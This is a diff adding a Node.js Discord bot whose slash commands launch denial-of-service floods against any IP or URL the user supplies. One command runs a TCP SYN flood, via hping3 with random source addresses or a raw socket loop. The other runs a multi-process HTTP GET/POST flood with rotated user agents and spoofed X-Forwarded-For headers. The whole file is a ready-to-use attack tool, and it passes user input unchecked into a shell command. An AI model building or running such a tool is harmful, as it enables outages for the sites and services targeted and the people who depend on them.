@@ -1,1 +1,265 @@
+const { Client, GatewayIntentBits, SlashCommandBuilder } = require('discord.js');
+const net = require('net');
+const http = require('http');
+const https = require('https');
+const dgram = require('dgram');
+const { exec } = require('child_process');
+const os = require('os');
+const cluster = require('cluster');
+const numCPUs = require('os').cpus().length;
 
+// Configuration
+const BOT_TOKEN = 'YOUR_DISCORD_BOT_TOKEN';
+const ALLOWED_USER_ID = 'YOUR_DISCORD_USER_ID';
+const MAX_DURATION = 300; // 5 minute max for safety
+const WORKER_COUNT = Math.min(numCPUs, 12); // Use up to 12 CPU cores
+
+// Discord client setup
+const client = new Client({ intents: [GatewayIntentBits.Guilds] });
+
+// Attack tracking
+const activeAttacks = new Map();
+
+// Bot ready event
+client.on('ready', () => {
+    console.log(`Logged in as ${client.user.tag}`);
+    
+    // Register slash commands
+    const commands = [
+        new SlashCommandBuilder()
+            .setName('tcp')
+            .setDescription('MONSTER TCP SYN flood')
+            .addStringOption(option =>
+                option.setName('target')
+                    .setDescription('IP:PORT (e.g. 1.1.1.1:25565)')
+                    .setRequired(true))
+            .addIntegerOption(option =>
+                option.setName('duration')
+                    .setDescription('Seconds (max 300)')
+                    .setRequired(true)),
+        new SlashCommandBuilder()
+            .setName('http')
+            .setDescription('BRUTAL HTTP flood')
+            .addStringOption(option =>
+                option.setName('url')
+                    .setDescription('Full URL (e.g. http://example.com)')
+                    .setRequired(true))
+            .addIntegerOption(option =>
+                option.setName('workers')
+                    .setDescription('Number of workers (1-1000)')
+                    .setRequired(true))
+            .addIntegerOption(option =>
+                option.setName('duration')
+                    .setDescription('Seconds (max 300)')
+                    .setRequired(true))
+    ];
+    
+    client.application.commands.set(commands)
+        .then(() => console.log('Commands registered'))
+        .catch(console.error);
+});
+
+// Command handler
+client.on('interactionCreate', async interaction => {
+    if (!interaction.isCommand()) return;
+    if (interaction.user.id !== ALLOWED_USER_ID) {
+        return interaction.reply({ content: '❌ Unauthorized', ephemeral: true });
+    }
+
+    if (interaction.commandName === 'tcp') {
+        handleTcpCommand(interaction);
+    } else if (interaction.commandName === 'http') {
+        handleHttpCommand(interaction);
+    }
+});
+
+function handleTcpCommand(interaction) {
+    const target = interaction.options.getString('target');
+    let duration = Math.min(interaction.options.getInteger('duration'), MAX_DURATION);
+    
+    const [ip, port] = target.split(':');
+    if (!ip || !port || isNaN(port)) {
+        return interaction.reply({ content: '❌ Invalid format. Use IP:PORT', ephemeral: true });
+    }
+
+    interaction.reply({ content: `💀 Launching MONSTER TCP SYN flood to ${ip}:${port} for ${duration} seconds...` });
+
+    const attackId = `tcp-${Date.now()}`;
+    activeAttacks.set(attackId, { stopped: false });
+
+    // Cluster mode for maximum SYN flood power
+    if (cluster.isPrimary) {
+        for (let i = 0; i < WORKER_COUNT; i++) {
+            cluster.fork({ 
+                TYPE: 'tcp',
+                IP: ip,
+                PORT: port,
+                DURATION: duration,
+                ATTACK_ID: attackId
+            });
+        }
+
+        cluster.on('exit', () => {});
+    }
+
+    setTimeout(() => stopAttack(attackId), duration * 1000);
+}
+
+function handleHttpCommand(interaction) {
+    const url = interaction.options.getString('url');
+    const workers = Math.min(Math.max(interaction.options.getInteger('workers'), 1), 1000);
+    const duration = Math.min(interaction.options.getInteger('duration'), MAX_DURATION);
+
+    interaction.reply({ content: `🔥 Starting BRUTAL HTTP flood to ${url} with ${workers} workers for ${duration} seconds...` });
+
+    const attackId = `http-${Date.now()}`;
+    activeAttacks.set(attackId, { stopped: false });
+
+    // Cluster mode for HTTP flood
+    if (cluster.isPrimary) {
+        const workersPerCPU = Math.ceil(workers / WORKER_COUNT);
+        
+        for (let i = 0; i < WORKER_COUNT; i++) {
+            cluster.fork({ 
+                TYPE: 'http',
+                URL: url,
+                WORKERS: workersPerCPU,
+                DURATION: duration,
+                ATTACK_ID: attackId
+            });
+        }
+    }
+    
+    setTimeout(() => stopAttack(attackId), duration * 1000);
+}
+
+// Worker processes
+if (cluster.isWorker) {
+    const type = process.env.TYPE;
+    const attackId = process.env.ATTACK_ID;
+    
+    if (type === 'tcp') {
+        const ip = process.env.IP;
+        const port = parseInt(process.env.PORT);
+        const duration = parseInt(process.env.DURATION);
+        
+        // Ultimate SYN flood implementation
+        if (os.platform() === 'linux') {
+            // Nuclear option - requires root
+            exec(`timeout ${duration} hping3 --flood --syn --rand-source -p ${port} ${ip}`, (err) => {
+                if (err && !err.killed) console.error(err);
+                process.exit();
+            });
+        } else {
+            // Fallback raw socket flood
+            const floodInterval = setInterval(() => {
+                if (activeAttacks.get(attackId)?.stopped) {
+                    clearInterval(floodInterval);
+                    process.exit();
+                }
+                
+                // Send 1000 SYN packets per interval
+                for (let i = 0; i < 1000; i++) {
+                    try {
+                        const socket = new net.Socket();
+                        socket.connect({
+                            host: ip,
+                            port: port,
+                            localAddress: `${randomByte()}.${randomByte()}.${randomByte()}.${randomByte()}`
+                        }, () => socket.destroy());
+                        socket.on('error', () => {});
+                        socket.setTimeout(100, () => socket.destroy());
+                    } catch (e) {}
+                }
+            }, 1);
+            
+            setTimeout(() => {
+                clearInterval(floodInterval);
+                process.exit();
+            }, duration * 1000);
+        }
+    } else if (type === 'http') {
+        const url = process.env.URL;
+        const workerCount = parseInt(process.env.WORKERS);
+        const duration = parseInt(process.env.DURATION);
+        
+        // Create HTTP/HTTPS agents with keepalive
+        const agent = url.startsWith('https') 
+            ? new https.Agent({ keepAlive: true, maxSockets: workerCount * 10 })
+            : new http.Agent({ keepAlive: true, maxSockets: workerCount * 10 });
+        
+        const startTime = Date.now();
+        const endTime = startTime + (duration * 1000);
+        
+        // Generate random user agents
+        const userAgents = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1'
+        ];
+        
+        // Brutal HTTP flood
+        while (Date.now() < endTime && !activeAttacks.get(attackId)?.stopped) {
+            for (let i = 0; i < workerCount; i++) {
+                // Alternate between GET and POST
+                const isPost = Math.random() > 0.5;
+                const options = {
+                    method: isPost ? 'POST' : 'GET',
+                    agent,
+                    headers: {
+                        'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
+                        'Accept': '*/*',
+                        'Connection': 'keep-alive',
+                        'Cache-Control': 'no-cache',
+                        'X-Forwarded-For': `${randomByte()}.${randomByte()}.${randomByte()}.${randomByte()}`
+                    }
+                };
+                
+                const req = (url.startsWith('https') ? https : http).request(url, options, (res) => {
+                    res.on('data', () => {});
+                    res.on('end', () => {});
+                });
+                
+                if (isPost) {
+                    req.write(generateRandomPostData());
+                }
+                
+                req.on('error', () => {});
+                req.end();
+            }
+        }
+        
+        process.exit();
+    }
+}
+
+function stopAttack(attackId) {
+    const attack = activeAttacks.get(attackId);
+    if (attack && !attack.stopped) {
+        attack.stopped = true;
+        console.log(`Stopped attack ${attackId}`);
+        
+        // Kill all workers
+        if (cluster.isPrimary) {
+            for (const id in cluster.workers) {
+                cluster.workers[id].kill();
+            }
+        }
+    }
+}
+
+function randomByte() {
+    return Math.floor(Math.random() * 254) + 1;
+}
+
+function generateRandomPostData() {
+    const randomStrings = [
+        'username=' + Math.random().toString(36).substring(2),
+        'password=' + Math.random().toString(36).substring(2),
+        'session=' + Math.random().toString(36).substring(2, 15),
+        'token=' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15)
+    ];
+    return randomStrings.join('&');
+}
+
+client.login(BOT_TOKEN);
